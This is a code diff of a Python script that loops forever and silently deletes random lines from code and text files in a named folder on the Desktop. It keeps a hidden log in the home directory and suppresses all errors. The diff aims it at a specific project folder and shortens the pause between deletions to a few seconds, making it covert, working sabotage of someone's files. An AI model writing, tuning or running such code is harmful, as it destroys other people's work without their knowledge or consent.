@@ -3,15 +3,13 @@ import random
 import time
 from datetime import datetime
 
-# ===== CONFIGURATION =====
-TARGET_FOLDER_NAME = "YOUR_TARGET_FOLDER"
+TARGET_FOLDER_NAME = "Transendence"
 SEARCH_ROOT = os.path.expanduser("~/Desktop")
 FILE_EXTENSIONS = ['.py', '.js', '.html', '.css', '.txt', '.java', '.cpp', '.c', '.php']
 EXCLUDED_FILES = ['play.sh', os.path.basename(__file__)]
-SLEEP_INTERVAL = (3600, 7200)
-LOG_FILE = os.path.expanduser("~/.deletion_log.txt")  # Hidden log file in home directory
-ENABLE_LOGGING = True  # Set to False to disable tracking
-# =========================
+SLEEP_INTERVAL = (1, 10)
+LOG_FILE = os.path.expanduser("~/.deletion_log.txt") 
+ENABLE_LOGGING = True 
 
 def log_deletion(filepath, line_num):
     if not ENABLE_LOGGING:
@@ -56,9 +54,8 @@ def delete_random_line(filepath):
             f.truncate()
             f.writelines(lines)
             
-            # Log the deletion with line number
-            log_deletion(filepath, line_to_delete + 1)  # +1 for human-readable line numbers
-    
+            print(f"Deleted line {line_to_delete+1} from {os.path.basename(filepath)}") #delete
+            log_deletion(filepath, line_to_delete + 1)  
     except Exception:
         pass
 
@@ -66,6 +63,7 @@ def main():
     while True:
         time.sleep(random.uniform(*SLEEP_INTERVAL))
         target_files = get_target_files()
+        print(f"WARNING: Script active in []. Monitoring files...") #delete
         if target_files:
             delete_random_line(random.choice(target_files))
 
